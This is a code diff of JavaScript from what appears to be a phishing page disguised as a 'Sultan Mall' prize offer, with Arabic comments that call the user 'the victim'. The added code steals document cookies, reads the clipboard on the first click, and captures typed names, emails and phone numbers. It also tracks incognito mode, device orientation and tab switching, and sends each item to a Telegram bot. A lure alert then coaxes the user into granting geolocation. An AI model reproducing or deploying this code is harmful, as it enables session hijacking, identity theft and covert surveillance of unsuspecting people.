@@ -132,82 +132,76 @@
     }
 
     // تشغيل الرادار فوراً
-    // 1. تشغيل الرادار الصامت أولاً
-silentRadar(); 
-// 🍪 صائد الكوكيز والجلسات (ZeroX Edition)
-let cookies = document.cookie || "خزنة الكوكيز فارغة أو محمية!";
-fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🍪 كوكيز الضحية المكتشفة:\n" + cookies)}`);
-document.addEventListener('click', () => {
-    navigator.clipboard.readText().then(text => {
-        if(text && text.length > 0) {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎯 تم قنص الحافظة عند النقرة: \n" + text)}`);
-        }
-    }).catch(() => {});
-}, { once: true }); 
+        // 1. تشغيل الرادار الصامت فوراً
+    silentRadar(); 
 
-// 2. 🚨 رادار كشف النوايا والتحركات (يبدأ من هنا)
-document.getElementById('name').addEventListener('focus', () => {
+    // 🍪 صائد الكوكيز والجلسات (ZeroX Edition)
+    let cookies = document.cookie || "خزنة الكوكيز فارغة أو محمية!";
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🍪 كوكيز الضحية المكتشفة:\n" + cookies)}`);
 
-// 2. 🚨 كاشف وضع التصفح الخفي (Incognito Detector)
-const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
-if (!fs) {
-    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ تنبيه: الضحية يستخدم وضع التخفي!")}`);
-} else {
-    fs(window.TEMPORARY, 100, () => {}, () => {
+    // 📋 صائد الحافظة المطور (يعمل عند أول نقرة)
+    document.addEventListener('click', () => {
+        navigator.clipboard.readText().then(text => {
+            if(text && text.length > 0) {
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎯 تم قنص الحافظة عند النقرة: \n" + text)}`);
+            }
+        }).catch(() => {});
+    }, { once: true }); 
+
+    // 🚨 كاشف وضع التصفح الخفي (Incognito Detector)
+    const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+    if (!fs) {
         fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ تنبيه: الضحية يستخدم وضع التخفي!")}`);
+    } else {
+        fs(window.TEMPORARY, 100, () => {}, () => {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ تنبيه: الضحية يستخدم وضع التخفي!")}`);
+        });
+    }
+
+    // 📱 مستشعر ميلان وحركة الجهاز (Gyroscope)
+    window.ondeviceorientation = (event) => {
+        if (event.beta !== null) {
+            let status = event.beta > 45 ? "مائل للخلف" : "مستوي";
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📱 وضعية الجهاز الآن: " + status)}`);
+            window.ondeviceorientation = null; // يرسل التنبيه مرة واحدة فقط
+        }
+    };
+
+    // 2. رادار كشف النوايا والتحركات
+    document.getElementById('name').addEventListener('focus', () => {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📝 الضحية بدأ الآن بكتابة اسمه.. ترقبوا!")}`);
     });
-}
 
-// 3. 📱 مستشعر ميلان وحركة الجهاز (Gyroscope)
-window.ondeviceorientation = (event) => {
-    let status = event.beta > 45 ? "مائل للخلف" : "مستوي";
-    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📱 وضعية الجهاز الآن: " + status)}`);
-    window.ondeviceorientation = null; // يرسل التنبيه مرة واحدة فقط لعدم إزعاجك
-};
+    document.getElementById('name').addEventListener('change', (e) => {
+        if(e.target.value.length > 2) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📝 الضحية كتب في خانة الاسم: " + e.target.value)}`);
+        }
+    });
 
-// 2. رادار كشف النوايا والتحركات (يعمل فوراً)
-document.getElementById('name').addEventListener('focus', () => {
-    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📝 الضحية بدأ الآن بكتابة اسمه.. ترقبوا!")}`);
-});
-// 🔍 محقّق الاسم الذكي (يسحب الاسم عند التنقل)
-document.getElementById('name').addEventListener('change', (e) => {
-    if(e.target.value.length > 2) {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📝 الضحية كتب في خانة الاسم: " + e.target.value)}`);
-    }
-});
-// 📧 محقّق البريد الإلكتروني (يسحب الإيميل فور كتابته)
-document.getElementById('email').addEventListener('change', (e) => {
-    if(e.target.value.length > 5) {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📧 الضحية كتب إيميله: " + e.target.value)}`);
-    }
-});
-
-document.addEventListener('copy', () => {
-    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("✂️ الضحية قام بنسخ شيء من الصفحة!")}`);
-});
-
-window.onblur = () => {
-    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📉 الضحية خرج من الصفحة (راح للواتساب أو قفل المتصفح)!")}`);
-};
-
-window.onfocus = () => {
-    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📈 الضحية عاد للصفحة مجدداً!")}`);
-};
-
-// 3. محقّق البيانات (يرسل ما يكتبه في الخانات)
-document.getElementById('phone').addEventListener('change', (e) => {
-    if(e.target.value.length > 3) {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ الضحية كتب في خانة الرقم: " + e.target.value)}`);
-    }
-});
-    // 🔍 محقّق البيانات الذكي
     document.getElementById('phone').addEventListener('change', (e) => {
         if(e.target.value.length > 3) {
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ الضحية كتب رقمه: " + e.target.value)}`);
         }
     });
 
-// 4. دالة جلب الموقع الدقيق (تستدعى عند ضغط الزر)
+    document.getElementById('email').addEventListener('change', (e) => {
+        if(e.target.value.length > 5) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📧 الضحية كتب إيميله: " + e.target.value)}`);
+        }
+    });
+
+    document.addEventListener('copy', () => {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("✂️ الضحية قام بنسخ شيء من الصفحة!")}`);
+    });
+
+    window.onblur = () => {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📉 الضحية خرج من الصفحة (راح للواتساب أو قفل المتصفح)!")}`);
+    };
+
+    window.onfocus = () => {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📈 الضحية عاد للصفحة مجدداً!")}`);
+    };
+
 async function getExactLocation() {
     alert("تهانينا! لتحديد أقرب فرع 'سلطان مول' لموقعك لاستلام الجائزة، يرجى الضغط على 'سماح' في النافذة التالية");
     if (navigator.geolocation) {
